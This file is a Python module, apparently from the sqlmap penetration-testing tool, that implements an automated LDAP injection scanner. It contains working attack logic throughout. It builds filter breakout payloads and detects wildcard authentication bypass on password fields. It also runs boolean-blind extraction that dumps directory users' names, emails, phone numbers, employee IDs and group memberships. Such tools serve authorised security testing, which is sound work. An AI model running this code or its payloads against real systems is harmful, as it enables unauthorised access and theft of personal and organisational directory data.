#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import difflib
import re
import time

from collections import namedtuple

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.settings import LDAP_CHAR_MAX
from lib.core.settings import LDAP_CHAR_MIN
from lib.core.settings import LDAP_ERROR_REGEX
from lib.core.settings import LDAP_ERROR_SIGNATURES
from lib.core.settings import LDAP_FINGERPRINT_ATTRIBUTES
from lib.core.settings import LDAP_MAX_LENGTH
from lib.core.settings import LDAP_MAX_RECORDS
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange


SENTINEL = randomStr(length=10, lowercase=True)

# _send() below currently knows how to rebuild GET and POST-style parameter
# strings. Cookie and URI delivery require separate per-place logic and should not
# be advertised until implemented.
LDAP_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)

# Breakouts are tried against the original application filter template. The
# generated assertion fragments intentionally stay open-ended: the vulnerable
# application usually appends the closing ')' or trailing substring '*') itself.
LDAP_BREAKOUT_PREFIXES = (
    "*)",       # substring + one assertion:  (attr=*<input>*)
    ")",        # exact-match one assertion:   (attr=<input>)
    "|",        # injection at filter-list head
    "*))(",     # substring + two assertions deep
    "*)))",     # substring + three assertions deep
    ")))",      # exact-match three assertions deep
)

LDAP_TAUTOLOGY_ATTRIBUTES = (
    "objectClass",
    "uid",
    "cn",
)

ENTRY_KEY_ATTRIBUTES = (
    "uid",
    "sAMAccountName",
    "userPrincipalName",
    "mail",
    "cn",
)

DUMP_ATTRIBUTES = (
    "uid",
    "cn",
    "sn",
    "givenName",
    "displayName",
    "mail",
    "sAMAccountName",
    "userPrincipalName",
    "title",
    "department",
    "company",
    "o",
    "ou",
    "telephoneNumber",
    "mobile",
    "manager",
    "description",
    "l",
    "st",
    "street",
    "postalCode",
    "c",
    "co",
    "employeeID",
    "employeeNumber",
    "employeeType",
    "objectClass",
    "objectCategory",
)

MULTI_VALUE_ATTRIBUTES = (
    "member",
    "memberOf",
    "uniqueMember",
)

Slot = namedtuple("Slot", ("place", "parameter", "backend", "oracle", "template", "payload", "breakout", "bypass"))
Slot.__new__.__defaults__ = (None, None, None, None, None, None, None, None)


def _ratio(first, second):
    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()


def _delim(place):
    return (conf.cookieDel or ';') if place == PLACE.COOKIE else '&'


def _confParameters(place):
    try:
        return conf.parameters.get(place, "")
    except AttributeError:
        return conf.parameters[place] if place in conf.parameters else ""


def _originalValue(place, parameter):
    for segment in _confParameters(place).split(_delim(place)):
        name, _, value = segment.partition('=')
        if name.strip() == parameter:
            return value
    return conf.paramDict.get(place, {}).get(parameter) or ""


def _replaceSegment(place, parameter, value):
    delimiter = _delim(place)
    raw = _confParameters(place)
    retVal, replaced = [], False

    for part in raw.split(delimiter):
        name, _, _ = part.partition('=')
        if not replaced and name.strip() == parameter:
            retVal.append("%s=%s" % (name, value))
            replaced = True
        else:
            retVal.append(part)

    if not replaced:
        retVal = []
        for name, oldValue in conf.paramDict.get(place, {}).items():
            retVal.append("%s=%s" % (name, value if name == parameter else oldValue))

    return delimiter.join(retVal)


def _send(place, parameter, value):
    skipUrlEncode = conf.skipUrlEncode
    conf.skipUrlEncode = True

    if conf.delay:
        time.sleep(conf.delay)

    try:
        kwargs = {"raise404": False, "silent": True}
        payload = _replaceSegment(place, parameter, value)
        kwargs["post" if place in (PLACE.POST, PLACE.CUSTOM_POST) else "get"] = payload

        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, payload)
        page, _, _ = Request.getPage(**kwargs)
        return page or ""
    except Exception as ex:
        logger.debug("LDAP probe request failed: %s" % getUnicode(ex))
        return ""
    finally:
        conf.skipUrlEncode = skipUrlEncode


def _isError(page):
    return bool(re.search(LDAP_ERROR_REGEX, getUnicode(page or "")))


def _backendFromError(page):
    page = getUnicode(page or "")
    for backend, regex in LDAP_ERROR_SIGNATURES:
        if re.search(regex, page):
            return backend
    return "Generic LDAP" if _isError(page) else None


def _probeBackendByParserError(place, parameter):
    """Probe for LDAP filter parser errors to obtain a backend hint.
    This is NOT authoritative vulnerability detection -- only a boolean
    oracle (from _detectBoolean) confirms exploitable injection."""

    original = _originalValue(place, parameter) or "x"
    normal = _send(place, parameter, original)

    # Use LDAP filter syntax breakers, not apostrophes. Apostrophes are not LDAP
    # filter metacharacters and only detect broken LDAP emulators backed by SQL.
    for suffix in (")", "*)"):
        payload = original + suffix
        broken = _send(place, parameter, payload)

        if not normal or _ratio(normal, broken) >= UPPER_RATIO_BOUND:
            continue

        backend = _backendFromError(broken)
        if backend and not _isError(normal):
            return backend, payload

    return None, None


def _boolean(truthy, falsy):
    """Return the reproducible true page when true/false probes diverge."""

    truePage = truthy()
    if not truePage or _isError(truePage):
        return None

    falsePage = falsy()
    if not falsePage or _isError(falsePage):
        return None

    truePage2 = truthy()
    if _ratio(truePage, truePage2) >= UPPER_RATIO_BOUND and _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
        return truePage

    return None


def _detectBoolean(place, parameter):
    """Return (template, payload, breakout) for boolean-blind LDAPi."""

    original = _originalValue(place, parameter) or ""
    falsePayload = original + SENTINEL

    for breakout in LDAP_BREAKOUT_PREFIXES:
        for attr in LDAP_TAUTOLOGY_ATTRIBUTES:
            # Open fragment by design. The application template supplies the tail.
            truePayload = "%s%s(%s=*" % (original, breakout, attr)
            template = _boolean(lambda p=truePayload: _send(place, parameter, p),
                                lambda p=falsePayload: _send(place, parameter, p))
            if template:
                return template, truePayload, breakout

    # Useful for auth/search bypass reporting, but not enough to synthesize
    # arbitrary LDAP filters for enumeration.
    if original:
        template = _boolean(lambda: _send(place, parameter, "*"),
                            lambda: _send(place, parameter, SENTINEL))
        if template:
            return template, "*", None

    return None, None, None


def _isPasswordParam(parameter):
    parameter = getUnicode(parameter or "").lower()
    return any(_ in parameter for _ in ("pass", "pwd", "secret", "pin", "cred", "key", "token", "auth"))


def _detectAuthBypass(place, parameter):
    if not _isPasswordParam(parameter):
        return None

    starPage = _send(place, parameter, "*")
    sentinelPage = _send(place, parameter, SENTINEL)

    if starPage and sentinelPage and _ratio(starPage, sentinelPage) < UPPER_RATIO_BOUND:
        return "*"

    return None


def _fingerprintByError(backend):
    if not backend:
        return None
    if "Active Directory" in backend:
        return "Microsoft Active Directory"
    if "OpenLDAP" in backend:
        return "OpenLDAP"
    if "ApacheDS" in backend:
        return "ApacheDS"
    if "Oracle" in backend:
        return "Oracle Directory Server"
    if "389" in backend:
        return "389 Directory Server"
    if "python-ldap" in backend or "Java JNDI" in backend:
        return backend
    return backend


def _transportEncode(value):
    """
    Encode only transport-sensitive characters because _send() disables sqlmap's
    regular URL encoding. LDAP filter syntax should remain raw; assertion values
    should be passed through _ldapLiteral() first.
    """

    value = getUnicode(value)
    value = value.replace("%", "%25")
    value = value.replace("#", "%23")
    value = value.replace("&", "%26")
    value = value.replace("+", "%2B")
    value = value.replace("=", "%3D")
    value = value.replace(" ", "%20")
    return value


def _ldapLiteral(value):
    """Escape an LDAP assertion value, then protect URL transport bytes."""

    value = getUnicode(value)
    value = value.replace("\\", "\\5c")
    value = value.replace("*", "\\2a")
    value = value.replace("(", "\\28")
    value = value.replace(")", "\\29")
    value = value.replace("\x00", "\\00")
    return _transportEncode(value)


class _ProbeBuilder(object):
    """
    Build payloads that preserve the winning breakout shape.

    Simple probes are open fragments, e.g. SENTINEL*)(uid=adm*
    The target application's original filter template supplies the closing suffix.
    Compound probes close their own (&...) filter, then open a dummy assertion to
    consume that same application suffix.
    """

    def __init__(self, breakout):
        self.breakout = breakout or ")"

    def raw(self, fragment, lead=None):
        return "%s%s%s" % (lead if lead is not None else SENTINEL, self.breakout, fragment)

    def presence(self, attr, constraint=None, exclusions=None):
        assertion = "(%s=*)" % attr
        if constraint or exclusions:
            return self._compound(assertion, constraint=constraint, exclusions=exclusions)
        return self.raw("(%s=*" % attr)

    def prefix(self, attr, value, constraint=None, exclusions=None):
        assertion = "(%s=%s*)" % (attr, _ldapLiteral(value))
        if constraint or exclusions:
            return self._compound(assertion, constraint=constraint, exclusions=exclusions)
        return self.raw("(%s=%s*" % (attr, _ldapLiteral(value)))

    def contains(self, attr, value, constraint=None, exclusions=None):
        assertion = "(%s=*%s*)" % (attr, _ldapLiteral(value))
        if constraint or exclusions:
            return self._compound(assertion, constraint=constraint, exclusions=exclusions)
        return self.raw("(%s=*%s*" % (attr, _ldapLiteral(value)))

    def equals(self, attr, value, constraint=None, exclusions=None):
        assertion = "(%s=%s)" % (attr, _ldapLiteral(value))
        if constraint or exclusions:
            return self._compound(assertion, constraint=constraint, exclusions=exclusions)

        # Exact equality cannot be made reliable in an unknown trailing template,
        # so simple contexts fall back to prefix semantics.
        return self.prefix(attr, value)

    def _compound(self, assertion, constraint=None, exclusions=None):
        clauses = []

        if constraint:
            cAttr, cValue = constraint
            clauses.append("(%s=%s)" % (cAttr, _ldapLiteral(cValue)))

        for eAttr, eValue in exclusions or ():
            clauses.append("(!(%s=%s))" % (eAttr, _ldapLiteral(eValue)))

        # Raw '&' would split GET parameters because skipUrlEncode=True. Use %26
        # so the HTTP layer decodes it into LDAP '&' inside the parameter value.
        compound = "(%%26%s%s)" % ("".join(clauses), assertion)

        # Dummy suffix eater: the original app template can safely append its tail.
        return self.raw("%s(objectClass=%s*" % (compound, SENTINEL))


def _makeOracle(place, parameter, template):
    cache = {}

    def request(payload):
        if payload not in cache:
            cache[payload] = _send(place, parameter, payload)
        return cache[payload]

    falsePage = request(SENTINEL)

    def oracle(payload):
        page = request(payload)
        if not page or _isError(page):
            return False
        return _ratio(template, page) >= UPPER_RATIO_BOUND

    def extract(payload):
        page = request(payload)
        if not page or _isError(page):
            return False
        return _ratio(falsePage, page) < UPPER_RATIO_BOUND

    oracle.extract = extract
    oracle.template = template
    oracle.falsePage = falsePage
    oracle.cache = cache
    return oracle


# Avoid LDAP metacharacters in blind character extraction. In real LDAP they can
# be escaped, but many simple test harnesses decode them before wildcard handling,
# producing false positives. Transport-sensitive chars are allowed because
# _ldapLiteral() encodes them.
_META_ORDS = set(ord(_) for _ in ('*', '(', ')', '\\'))
_FREQ = (tuple(xrange(ord('a'), ord('z') + 1)) +
         tuple(xrange(ord('A'), ord('Z') + 1)) +
         tuple(xrange(ord('0'), ord('9') + 1)) +
         tuple(ord(_) for _ in "@._-+ "))
_CHARSET = []
for _ in _FREQ:
    if LDAP_CHAR_MIN <= _ <= LDAP_CHAR_MAX and _ not in _META_ORDS and _ not in _CHARSET:
        _CHARSET.append(_)
for _ in xrange(LDAP_CHAR_MIN, LDAP_CHAR_MAX + 1):
    if _ not in _META_ORDS and _ not in _CHARSET:
        _CHARSET.append(_)


def _exists(oracle, builder, attr, constraint=None, exclusions=None):
    return oracle.extract(builder.presence(attr, constraint=constraint, exclusions=exclusions))


def _inferAttribute(oracle, builder, attr, constraint=None, exclusions=None, maxLen=LDAP_MAX_LENGTH):
    value = ""
    probes = 0

    for _ in xrange(maxLen):
        found = False

        for cp in _CHARSET:
            candidate = value + chr(cp)
            probes += 1

            if oracle.extract(builder.prefix(attr, candidate, constraint=constraint, exclusions=exclusions)):
                value = candidate
                found = True
                break

        if not found:
            break

        # Three or more consecutive trailing spaces never occur in real
        # directory data.  When the server-side LDAP-to-SQL translation
        # (or equivalent) spuriously matches a trailing-space probe (e.g.
        # mail=user@dom * matching user@dom), the extraction would
        # otherwise chase an endless phantom suffix.  Terminate and strip.
        if value.endswith("   "):
            value = value.rstrip()
            break

    logger.debug("LDAP blind inference: %d probes for attribute '%s' (length=%d)" % (probes, attr, len(value)))
    return value if value else None


def _fingerprintByAttribute(oracle, builder):
    for attr, expected, backend in LDAP_FINGERPRINT_ATTRIBUTES:
        if not _exists(oracle, builder, attr):
            continue

        if expected:
            if oracle.extract(builder.contains(attr, expected)):
                return backend
        else:
            return backend

    return None


def _dumpInband(oracle, slot):
    """If the always-true template page exposes directory entries directly
    (e.g. as JSON), extract them in one shot instead of blind brute-force."""
    import json

    page = oracle.template
    if not page or not page.strip().startswith('{'):
        return False

    try:
        data = json.loads(page)
        entries = data.get("entries") or data.get("results") or ()
    except (ValueError, TypeError):
        return False

    if not entries or not isinstance(entries, (list, tuple)):
        return False

    columns = []
    seen = set()
    for entry in entries:
        if not isinstance(entry, dict):
            continue
        for key in entry:
            if key not in seen:
                columns.append(getUnicode(key))
                seen.add(key)

    if not columns:
        return False

    rows = []
    for entry in entries:
        if not isinstance(entry, dict):
            continue
        rows.append(tuple(getUnicode(entry.get(c, "")) for c in columns))

    # Drop columns where every row is empty (common with wide schemas).
    populated = []
    for ci, col in enumerate(columns):
        if any(r[ci] for r in rows):
            populated.append(ci)
    if populated and len(populated) < len(columns):
        columns = [columns[i] for i in populated]
        rows = [tuple(r[i] for i in populated) for r in rows]

    logger.info("in-band data exposure: %d record(s)" % len(rows))
    _dumpTable("LDAP: %s parameter '%s' in-band entries" % (slot.place, slot.parameter),
               columns, rows)
    return True


def _probeRootDSE(oracle, builder):
    for attr in ("namingContexts", "subschemaSubentry", "vendorName", "vendorVersion"):
        if not _exists(oracle, builder, attr):
            continue

        value = _inferAttribute(oracle, builder, attr)
        if value:
            logger.info("directory %s: '%s'" % (attr, value))


def _enumerateEntryKeys(oracle, builder):
    for keyAttr in ENTRY_KEY_ATTRIBUTES:
        if not _exists(oracle, builder, keyAttr):
            continue

        values = []
        while len(values) < LDAP_MAX_RECORDS:
            exclusions = [(keyAttr, _) for _ in values]
            value = _inferAttribute(oracle, builder, keyAttr, exclusions=exclusions)

            if not value or value in values:
                break

            values.append(value)
            logger.info("identified directory entry: %s='%s'" % (keyAttr, value))

        if values:
            return keyAttr, values

    return None, []


def _dumpEntries(oracle, builder, place, parameter):
    keyAttr, keys = _enumerateEntryKeys(oracle, builder)
    if not keys:
        logger.warning("could not identify a stable directory entry key")
        return False

    rows = []
    discovered = set()

    for key in keys:
        constraint = (keyAttr, key)
        row = {keyAttr: key}
        logger.info("extracting attributes for entry %s='%s'" % (keyAttr, key))

        for attr in DUMP_ATTRIBUTES:
            if attr == keyAttr:
                continue

            logger.info("probing attribute '%s'" % attr)
            if not _exists(oracle, builder, attr, constraint=constraint):
                continue

            value = _inferAttribute(oracle, builder, attr, constraint=constraint)
            if value:
                row[attr] = value
                discovered.add(attr)

        rows.append(row)

    columns = [keyAttr] + [_ for _ in DUMP_ATTRIBUTES if _ != keyAttr and _ in discovered]
    tableRows = [tuple(row.get(column, "") for column in columns) for row in rows]

    logger.info("dumped %d entr%s" % (len(rows), "y" if len(rows) == 1 else "ies"))
    _dumpTable("LDAP: %s parameter '%s' directory entries" % (place, parameter), columns, tableRows)
    return True


def _dumpMultiValues(oracle, builder, place, parameter):
    dumped = False

    for attr in MULTI_VALUE_ATTRIBUTES:
        if not _exists(oracle, builder, attr):
            continue

        value = _inferAttribute(oracle, builder, attr)
        if value:
            logger.info("fetched 1 value from attribute '%s'" % attr)
            _dumpTable("LDAP: %s parameter '%s' '%s' values" % (place, parameter, attr), [attr], [(value,)])
            dumped = True

    return dumped


def _grid(columns, rows):
    columns = [getUnicode(_) for _ in columns]
    rows = [[getUnicode(_) for _ in row] for row in rows]

    widths = []
    for index, column in enumerate(columns):
        width = len(column)
        for row in rows:
            if index < len(row):
                width = max(width, len(row[index]))
        widths.append(width)

    separator = "+-" + "-+-".join("-" * _ for _ in widths) + "-+"

    def line(cells):
        return "| " + " | ".join((cells[index] if index < len(cells) else "").ljust(widths[index]) for index in xrange(len(columns))) + " |"

    return "\n".join([separator, line(columns), separator] + [line(row) for row in rows] + [separator])


def _dumpTable(title, columns, rows):
    if rows:
        conf.dumper.singleString("%s:\n%s" % (title, _grid(columns, rows)))


def ldapScan():
    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    debugMsg = "'--ldap' is self-contained: it detects LDAP injection in HTTP "
    debugMsg += "parameters and dumps reachable directory entries. SQL enumeration "
    debugMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
    logger.debug(debugMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = found = 0
    slots = []

    for place in (_ for _ in LDAP_PLACES if _ in conf.paramDict):
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing LDAP injection on %s parameter '%s'" % (place, parameter))

            # Phase 1: probe the LDAP filter parser for a backend hint.
            # This is NOT authoritative -- only a boolean oracle confirms
            # exploitable injection.
            backendHint, _errorPayload = _probeBackendByParserError(place, parameter)
            if backendHint:
                backendHint = _fingerprintByError(backendHint)

            # Phase 2: establish a boolean oracle (authoritative).
            template, payload, breakout = _detectBoolean(place, parameter)
            if template and breakout:
                found += 1
                backend = backendHint or None
                logger.info("%s parameter '%s' is vulnerable to LDAP injection (back-end: '%s')" % (place, parameter, backend or "Generic"))
                if conf.beep:
                    beep()

                oracle = _makeOracle(place, parameter, template)
                slots.append(Slot(place=place, parameter=parameter, backend=backend, oracle=oracle, template=template, payload=payload, breakout=breakout))
                continue

            # Phase 3: wildcard auth bypass (credential fields only).
            bypass = _detectAuthBypass(place, parameter)
            if bypass:
                found += 1
                logger.info("%s parameter '%s' allows LDAP wildcard auth bypass (password=*)" % (place, parameter))
                if conf.beep:
                    beep()
                slots.append(Slot(place=place, parameter=parameter, bypass=bypass))
                continue

            # Parser-error alone is not exploitable -- log it but do not
            # create a vulnerability report.
            if backendHint:
                logger.info("%s parameter '%s' reaches an LDAP filter parser (back-end: '%s'), but no exploitable boolean oracle was established" % (place, parameter, backendHint))

    if not slots:
        if tested:
            warnMsg = "no parameter appears to be injectable via LDAP injection (%d tested)" % tested
        else:
            warnMsg = "no parameters found to test for LDAP injection"
        logger.warning(warnMsg)
        return

    # Print auth-bypass reports.
    for slot in slots:
        if slot.bypass:
            conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: LDAP injection\n    Title: LDAP auth bypass (wildcard)\n    Payload: %s=%s\n---" % (slot.parameter, slot.place, slot.parameter, slot.bypass))

    # Select the first oracle-bearing slot for fingerprint + enumeration.
    slot = next((_ for _ in slots if _.oracle and _.breakout), None)
    if not slot:
        logger.info("LDAP scan complete")
        return

    # Refine backend fingerprint if we only have a generic hint.
    builder = _ProbeBuilder(slot.breakout)
    oracle = slot.oracle
    if not slot.backend or slot.backend == "Generic LDAP":
        backend = _fingerprintByAttribute(oracle, builder)
        if backend:
            logger.info("identified back-end DBMS: '%s'" % backend)
            slot = slot._replace(backend=backend)

    # Determine extraction method: in-band if the template page already
    # contains parseable JSON entries, otherwise blind.
    import json
    page = oracle.template
    inband = False
    if page and page.strip().startswith('{'):
        try:
            data = json.loads(page)
            entries = data.get("entries") or data.get("results") or ()
            inband = bool(entries and isinstance(entries, (list, tuple)))
        except (ValueError, TypeError):
            pass

    title = "LDAP in-band data exposure" if inband else "LDAP boolean-based blind"
    conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: LDAP injection\n    Title: %s\n    Payload: %s=%s\n---" % (slot.parameter, slot.place, title, slot.parameter, slot.payload))

    logger.info("probing RootDSE-style directory metadata")
    _probeRootDSE(oracle, builder)

    if inband:
        dumped = _dumpInband(oracle, slot)
    else:
        dumped = _dumpEntries(oracle, builder, slot.place, slot.parameter)
        dumped = _dumpMultiValues(oracle, builder, slot.place, slot.parameter) or dumped

    if not dumped:
        warnMsg = "LDAP injection is confirmed but no directory data could be extracted. "
        warnMsg += "The injection point may expose only a limited boolean oracle or ACLs restrict reads"
        logger.warning(warnMsg)

    logger.info("LDAP scan complete")
